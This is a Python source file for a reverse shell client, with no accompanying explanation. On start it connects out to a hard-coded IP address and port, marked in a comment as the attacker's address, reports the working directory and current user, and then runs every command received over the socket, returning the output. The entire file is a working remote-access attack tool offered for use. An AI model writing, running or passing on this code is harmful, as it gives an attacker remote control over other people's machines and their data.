import socket,os,argparse,subprocess
from sys import exit
def create_socket(host,port):
    try:
        s=socket.socket()
        s.connect((host,port))
        execute_cmd(s)
    except socket.error as err:
        print(f"[-] Error occured at socket processing, Reason {err}",'red')

def execute_cmd(s):
    s.send(os.getcwd().encode())
    s.send(subprocess.getoutput('whoami').encode())
    while True:
        try:
            cmd=s.recv(bufferSize).decode().strip()
            if cmd.lower()=='quit':
                break
            cmd_split=cmd.split()
            if cmd_split[0].lower()=='cd':
                try:
                    os.chdir(' '.join(cmd_split[1:]))
                except FileNotFoundError as e:
                    output=str(e)
                else:
                    output=""
            else:
                output=subprocess.getoutput(cmd)
            s.send(f"{output}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
        except Exception as e:
            print(f"[-] Error executing command: {e}")
            break
    s.close()


if __name__=="__main__":
    host="192.168.19.9" # change it to attacker IP address
    port=1337
    bufferSize=1024 * 256 # for 256kb messages buffer
    Separator = "<sep>"
    create_socket(host,port)
    
